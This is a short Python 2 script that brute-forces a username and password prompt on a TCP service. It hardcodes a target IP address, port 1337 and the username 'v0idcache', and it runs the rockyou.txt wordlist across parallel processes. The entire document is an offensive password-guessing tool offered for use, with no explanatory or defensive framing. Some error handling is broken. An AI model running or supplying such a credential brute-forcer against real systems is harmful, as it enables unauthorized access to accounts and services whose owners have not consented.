import socket
import multiprocessing
import sys

threads = 2
host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt"
username = "v0idcache"

text_file = open(wordlist,"r")
passwords = text_file.read().split('\n')

def split_list(l, n):
  return [l[i:i+n] for i in range(0, len(l), n)]

def brute_force(host, port, username, password):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data=s.recv(1024)
    s.send(username+'\n')
    data=s.recv(1024)
    s.send(password+'\n')
    data=s.recv(1024)
    s.close()
  except SocketError as e:
    print "error"
  finally:
    return data


def caller(job_id, data_slice):
  for password in data_slice:
    p = brute_force(host, port, username, password)
    if "Fail" in p:
      print 'Failed Password:',password
    else:
      print 'We got it User:',username,'Password:',password
      socket.socket().close()
      sys.exit(1)



def dispatcher(passwords, job_number):
  total = len(passwords)
  chunk_size = total / job_number
  slice = split_list(passwords, chunk_size)
  jobs = []

  for i, s in enumerate(slice):
    j = multiprocessing.Process(target=caller, args=(i, s))
    jobs.append(j)
  for j in jobs:
    j.start()

if __name__ == '__main__':
    dispatcher(passwords, threads)
